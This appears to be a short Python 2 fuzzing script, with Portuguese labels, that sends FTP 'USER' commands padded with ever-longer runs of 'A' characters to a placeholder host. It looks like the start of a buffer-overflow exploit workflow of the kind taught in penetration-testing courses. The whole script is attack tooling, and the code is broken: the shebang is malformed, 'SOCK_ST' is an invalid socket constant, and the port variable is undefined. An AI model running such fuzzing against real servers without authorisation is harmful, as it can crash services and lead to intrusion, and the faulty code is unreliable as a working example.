#!usr/bin/python
import socket

buffer=["A"]
contador=100
while len(buffer) <= 25:
    buffer.append("A"*contador)
    contador=contador+200

for string in buffer:
    print "Fuzz FTP User com %s bytes"%len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_ST)
    s.connect(("ip",porta))
    s.send("User "+string+"\r\n")
    
    
